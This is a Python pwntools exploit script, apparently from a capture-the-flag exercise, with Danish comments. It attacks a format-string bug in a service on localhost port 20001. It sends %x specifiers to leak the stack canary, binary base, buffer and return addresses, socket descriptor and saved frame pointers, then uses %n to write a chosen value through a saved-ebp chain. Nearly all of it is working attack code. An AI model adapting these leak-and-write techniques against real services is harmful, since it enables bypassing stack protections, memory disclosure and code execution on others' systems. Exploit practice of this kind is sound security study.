#!/usr/bin/env python2
# -*- coding: utf-8 -*-

from pwn import *

context(arch = "i386", os = "linux")

#%134 - Canary
#%136 - 12288 bytes into fmt
#%137 - 556 bytes further than buffer
#ret lies 528 bytes further than buffer
#%139 - Socket fd

r = remote("localhost", 20001)
r.recvuntil("How may I help you?\n")

#Nu kender vi positionerne og offsets på alt hvad vi vil vide, lad os leake dem
r.sendline(flat(
    "%134$08x",
    "%136$08x",
    "%137$08x",#ebp1
    "%139$08x",
    "%145$08x",#ebp2
    "%157$08x" #ebp3
    ))
line = r.recvline().rstrip()
canary = int(line[0:8], 16)
fmt_base = int(line[8:16], 16) - 12288
ebp1 = int(line[16:24], 16)
buffer = ebp1 - 556
ret = buffer + 528
socket_fd = int(line[24:32], 16)
ebp2 = int(line[32:40], 16)
ebp3 = int(line[40:48], 16)

print "Canary: 0x%08x" % canary
print "fmt is loaded at 0x%08x" % fmt_base
print "buffer is at 0x%08x" % buffer
print "return address is at 0x%08x" % ret
print "socket fd: %d" % socket_fd
print "ebp1: 0x%08x" % ebp1
print "ebp2: 0x%08x" % ebp2
print "ebp3: 0x%08x" % ebp3

#ebp2 - %145  peger på ebp3
#Lad os sætte ebp3 til at have værdien 42
r.sendline('A' * 42 + '%145$n')
r.readline()

#Den skulle nu gerne være opdateret. Lad os tjekke den

r.sendline('%157$08x')
print 'ebp3 after update: %s' % r.readline()
